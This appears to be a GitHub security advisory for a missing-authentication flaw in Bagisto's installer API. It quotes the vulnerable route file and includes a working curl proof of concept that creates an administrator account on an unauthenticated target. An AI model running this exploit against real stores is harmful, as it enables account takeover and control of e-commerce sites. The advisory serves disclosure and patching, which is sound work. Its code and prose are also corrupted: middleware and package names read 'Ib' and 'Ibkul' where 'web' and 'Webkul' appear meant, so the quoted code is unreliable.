# [H] Bagisto Missing Authentication on Installer API Endpoints

## Summary
Severity: High
Advisory: GHSA-6h7w-v2xr-mqvw
CVE: CVE-2026-21446
CWE: CWE-306
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-01-02
Source: https://github.com/advisories/GHSA-6h7w-v2xr-mqvw
Type: github-advisory

## Affected
- Packagist: `bagisto/bagisto` — affected >=2.3.0 <2.3.10

## Details
### Vulnerable Code

**File:** `packages/Ibkul/Installer/src/Routes/Ib.php`

```
<?php

use Illuminate\\Session\\Middleware\\StartSession;  
use Illuminate\\Support\\Facades\\Route;  
use Ibkul\\Installer\\Http\\Controllers\\InstallerController;

Route::middleware(\['Ib', 'installer\_locale'\])-\>group(function () {  
    Route::controller(InstallerController::class)-\>group(function () {  
        Route::get('install', 'index')-\>name('installer.index');

        Route::middleware(StartSession::class)-\>prefix('install/api')-\>group(function () {  
            Route::post('env-file-setup', 'envFileSetup')-\>name('installer.env\_file\_setup');  
            Route::post('run-migration', 'runMigration')-\>name('installer.run\_migration')-\>withoutMiddleware('Ib');  
            Route::post('run-seeder', 'runSeeder')-\>name('installer.run\_seeder')-\>withoutMiddleware('Ib');  
            Route::get('download-sample', 'downloadSample')-\>name('installer.download\_sample')-\>withoutMiddleware('Ib');  
            Route::post('admin-config-setup', 'adminConfigSetup')-\>name('installer.admin\_config\_setup')-\>withoutMiddleware('Ib');  
            Route::post('sample-products-setup', 'createSampleProducts')-\>name('installer.sample\_products\_setup')-\>withoutMiddleware('Ib');  
        });  
    });  
});
```

API routes remain active even after initial installation is complete, allowing any unauthenticated attacker to:

- Create admin accounts  
- Modify application configuration  
- Potentially overwrite existing data

the underlying **API endpoints** (`/install/api/*`) are directly accessible and exploitable without any authentication. An attacker can bypass the Ib installer entirely by calling the API endpoints directly.

### How to Reproduce

1. The Ib installer UI at `http://localhost:8000/install` has client-side protections  
2. **However, the API endpoints are directly exploitable:**  
   - The attack works by calling `/install/api/admin-config-setup` directly via curl/HTTP client  
   - No CSRF token, session, or authentication is required  
   - The Ib UI workflow is completely bypassed

### Proof of Concept

```
#!/bin/bash
# PoC: Create admin account without authentication


TARGET="http://localhost:8000"


# Create a new admin account
curl -X POST "$TARGET/install/api/admin-config-setup" \
    -H "Content-Type: application/json" \
    -d '{
        "admin_name": "Attacker",
        "admin_email": "attacker@evil.com",
        "admin_password": "HackedPassword123"
    }'


echo ""
echo "New admin account created!"
echo "Login at: $TARGET/admin"
echo "Email: attacker@evil.com"
```

### Expected Result

The API should reject unauthenticated requests with 401/403 status.

### Actual Result

The API accepts the request and creates a new admin account, allowing full administrative access to the e-commerce platform.

### Recommended Patch

Add installation completion check

```
// In InstallerController.php or a new middleware


public function __construct()
{
    // Check if application is already installed
    if (file_exists(base_path('.env')) &&
        config('app.key') &&
        \Schema::hasTable('admins') &&
        \DB::table('admins')->count() > 0) {
        abort(404, 'Application already installed');
    }
}
```

## References
- https://github.com/bagisto/bagisto/security/advisories/GHSA-6h7w-v2xr-mqvw
- https://nvd.nist.gov/vuln/detail/CVE-2026-21446
- https://github.com/bagisto/bagisto/commit/380c045e48490da740cd505fb192cc45e1809bed
- https://github.com/bagisto/bagisto
